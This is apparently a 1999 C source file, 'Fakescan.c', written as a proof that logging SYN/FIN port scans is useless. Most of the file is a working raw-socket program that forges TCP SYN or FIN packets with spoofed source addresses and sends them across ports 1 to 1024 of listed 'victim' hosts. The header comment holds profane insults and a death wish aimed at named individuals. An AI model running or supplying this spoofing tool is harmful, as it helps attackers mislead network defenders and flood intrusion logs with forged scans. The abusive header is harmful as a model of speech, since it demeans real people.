/*
 * Fakescan.c (c) 1999 Vortexia / Andrew Alston andrew@idle.za.org
 * 
 * Ok... more crap code from me... thats yes... entirely useless other than as a
 * proof of case.  I wrote this quickly while trying to prove the case that
 * logging portscans that are syn/fin based is entirely useless.
 * 
 * What the code does: It reads in a list of hosts to spoof from a spoof host,
 * and sends fake fin or syn scans to a list of hosts found in the victims
 * file. Sorry there is no dns resolve on hosts in those files, it was a
 * quick job while I was bored and I found better things to do while coding
 * it so I didnt get around to adding it.
 * 
 * The code is once again written for BSD and compiles with no warnings under
 * fbsd 3.2 - I hate linux - Dont expect a linux port from me, someone else -
 * feel free to make one
 * 
 * If you wanna use my code, as always, feel free but I expect credit where
 * credit is due, I.E you use my code, you put my name in your code.
 * 
 * Greets and Shoutouts..
 * 
 * Mithrandi - Thanks for your help Ultima - For everything you've helped me
 * with in the past Van - What can I say, HI TimeWiz - Thanks for help in
 * times past, and for ideas for upcoming projects Sniper - My partner in
 * crime - You have and always will rock Opium - HI Hotmetal - A general
 * greet DrSmoke - HI jus - My social engineering partner - lets continue to
 * mindfuck together OPCODE - Thanks for the help - you rock gr1p and all the
 * people at b4b0 - Keep rocking guys To all the people at Forbidden
 * knowledge - Good going - Keep it up To everyone else on all the networks
 * and channels I hang on, a general greet and thanks - I couldnt keep doing
 * what I do without you guys.
 * 
 * Fuckoffs, Curses and the likes:
 * 
 * To Sunflower - If you cant handle an insult in a piece of code - and think
 * thats worth of an akill - GROW UP AND GO FUCK YOURSELF To Gaspode - May
 * you die a slow and painful death, and may the fleas of 10000 camels infest
 * your armpits To the person who said coding stuff like this was for script
 * kiddies - GET A CLUE you know who you are To anyone else I dont like -
 * FUCK YOU To anyone else who doesnt like me - FUCK YOU
 * 
 */
#define __FAVOR_BSD
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>

struct viclist {
	struct in_addr  victim;
	struct viclist *link;
};

struct slist {
	struct in_addr  spoof;
	struct slist   *link;
};

int 
main(int argc, char *argv[])
{

	int             i = 0;
	int             sock;
	int             on = 1;
	struct sockaddr_in sockstruct;
	struct ip      *iphead;
	struct tcphdr  *tcphead;
	char            evilpacket[sizeof(struct ip) + sizeof(struct tcphdr)];
	int             seq, ack;
	FILE           *victimfile;
	FILE           *spooffile;
	char            buffer[256];
	struct viclist *vcur, *vfirst;
	struct slist   *scur, *sfirst;

	bzero(evilpacket, sizeof(evilpacket));

	vfirst = malloc(sizeof(struct viclist));
	vcur = vfirst;
	vcur->link = NULL;

	sfirst = malloc(sizeof(struct slist));
	scur = sfirst;
	scur->link = NULL;

	if (argc < 4) {
		printf("Usage: %s scan_type ((S)yn/(F)in) spoof_file victim_file\n"
		  "Example: %s S spooffile victimfile\n", argv[0], argv[0]);
		exit(-1);
	};

	if ((strncmp(argv[1], "S", 1)) && (strncmp(argv[1], "F", 1))) {
		printf("Scan type not specified\n");
		exit(-1);
	}
	if ((spooffile = fopen((char *) argv[2], "r")) <= 0) {
		perror("fopen");
		exit(-1);
	} else {
		while (fgets(buffer, 255, spooffile)) {
			if (!(inet_aton(buffer, &(scur->spoof))))
				printf("Invalid address found in victim file.. ignoring\n");
			else {
				scur->link = malloc(sizeof(struct slist));
				scur = scur->link;
				scur->link = NULL;
			}
		};
		bzero(buffer, sizeof(buffer));
	};

	fclose(spooffile);
	scur = sfirst;
	while (scur->link != NULL) {
		printf("Found spoof host: %s\n", inet_ntoa(scur->spoof));
		scur = scur->link;
	};
	scur = sfirst;

	if ((victimfile = fopen((char *) argv[3], "r")) <= 0) {
		perror("fopen");
		exit(-1);
	} else {
		while (fgets(buffer, 255, victimfile)) {
			if (!(inet_aton(buffer, &(vcur->victim))))
				printf("Invalid address found in victim file.. ignoring\n");
			else {
				vcur->link = malloc(sizeof(struct viclist));
				vcur = vcur->link;
				vcur->link = NULL;
			}
		};
		bzero(buffer, sizeof(buffer));
	};
	fclose(victimfile);
	vcur = vfirst;
	while (vcur->link != NULL) {
		printf("Found victim host: %s\n", inet_ntoa(vcur->victim));
		vcur = vcur->link;
	};
	vcur = vfirst;

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket");
		exit(-1);
	}
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) < 0) {
		perror("setsockopt");
		exit(-1);
	}
	sockstruct.sin_family = AF_INET;
	iphead = (struct ip *) evilpacket;
	tcphead = (struct tcphdr *) (evilpacket + sizeof(struct ip));

	iphead->ip_hl = 5;
	iphead->ip_v = 4;
	iphead->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iphead->ip_id = htons(getpid());
	iphead->ip_ttl = 255;
	iphead->ip_p = IPPROTO_TCP;
	iphead->ip_sum = 0;
	iphead->ip_tos = 0;
	iphead->ip_off = 0;
	tcphead->th_win = htons(512);
	if (!(strncmp(argv[1], "S", 1)))
		tcphead->th_flags = TH_SYN;
	else
		tcphead->th_flags = TH_FIN;
	tcphead->th_off = 0x50;

	while (vcur->link != NULL) {
		iphead->ip_dst = vcur->victim;
		sleep(1);
		while (scur->link != NULL) {
			seq = rand() % time(NULL);
			ack = rand() % time(NULL);
			tcphead->th_sport = htons(rand() % time(NULL));
			sockstruct.sin_port = htons(rand() % time(NULL));
			iphead->ip_src = scur->spoof;
			sockstruct.sin_addr = scur->spoof;
			sleep(1);
			for (i = 1; i <= 1024; i++) {
				seq += (rand() %10)+50;
				ack += (rand() %10)+50;
				srand(getpid());
				tcphead->th_seq = htonl(seq);
				tcphead->th_ack = htonl(ack);
				tcphead->th_dport = htons(i);
				sendto(sock, &evilpacket, sizeof(evilpacket), 0x0,
				       (struct sockaddr *) & sockstruct, sizeof(sockstruct));
			}
			scur = scur->link;
		}
		scur = sfirst;
		vcur = vcur->link;
	}
	return (1);

};
